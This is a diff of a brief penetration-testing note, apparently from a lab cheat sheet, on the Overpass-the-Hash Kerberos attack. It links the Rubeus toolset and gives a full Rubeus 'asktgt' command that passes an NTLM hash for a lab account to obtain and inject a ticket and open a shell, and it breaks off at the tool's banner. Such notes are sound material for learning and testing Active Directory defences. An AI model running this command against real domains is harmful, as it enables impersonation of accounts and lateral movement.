@@ -1,12 +1,15 @@
 ======================================================================================================================
-Example - Overpass-The-Hash attack with the tool Rubeus
+Overpass-The-Hash attack
 ======================================================================================================================
 
 The 'Overpass-the-hash' technique is a combination of passing the hash and passing the ticket. 
-It can be done using the Rubeus (C# toolset for raw Kerberos interaction and abuses).
+
+It can be done using the tool Rubeus (C# toolset for raw Kerberos interaction and abuses).
 Link: https://github.com/GhostPack/Rubeus
  
 
+Example - Overpass-The-Hash attack with the tool Rubeus
+======================================================================================================================
 
 PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\rub.exe asktgt /user:batch-prod /rc4:49DE316D55D2EF98DB702E743538A291 /domain:security-test-lab.local /dc:192.168.1.50 /ptt /createnetonly:C:\Windows\System32\cmd.exe
    ______        _
